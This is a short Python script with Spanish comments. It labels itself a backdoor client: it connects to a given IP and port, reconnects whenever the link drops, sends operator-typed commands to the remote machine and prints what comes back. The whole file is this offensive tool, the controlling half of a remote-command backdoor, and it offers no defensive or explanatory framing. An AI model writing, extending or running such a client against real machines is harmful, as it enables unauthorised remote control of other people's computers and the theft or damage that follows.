import socket
import argparse
import time
import os
import platform

args=argparse.ArgumentParser()
args.add_argument('-P','--puerto',type=int)
args.add_argument('-IP','--ip',type=str)
arg = args.parse_args()

# cliente backdor

n = 0
timeout = 5

if platform.system() == 'Linux':
    borrar = 'clear'

elif platform.system() == 'Windows':
    borrar = 'cls'

def shell(socket):
   
    entrada = str(input('[#] comando >> '))
    if entrada == 'q':
        print('\n[*] saliendo\n')
        exit(0)
    elif entrada == 'borrar':
        os.system(borrar)
    else:
        socket.send(entrada.encode())
        salida = socket.recv(1024).decode()
        if salida != None:
            print(salida)
        else:
            print('\nno hubo respuesta\n')
        return salida
    
def conexion(contador):

    print('\n[*] iniciando...\n')
    entrada = None
    salida = None
    while entrada != 'q':
        s= socket.socket()
        
        s.settimeout(timeout)
        try:
            
            if s.connect_ex((arg.ip,arg.puerto)) == 0:
                if contador == 0:
                    print(f'\n[*] conectado a {arg.ip}:{arg.puerto}')
                salida = shell(socket=s)
            else:
                print('conexion perdida')
                raise TimeoutError
        except (TimeoutError,ConnectionResetError):
            
            print('\n[!] reconectando ...\n')
        
            time.sleep(timeout)
            
            os.system(borrar)

            

        finally:
           contador= 1
            

conexion(contador=n)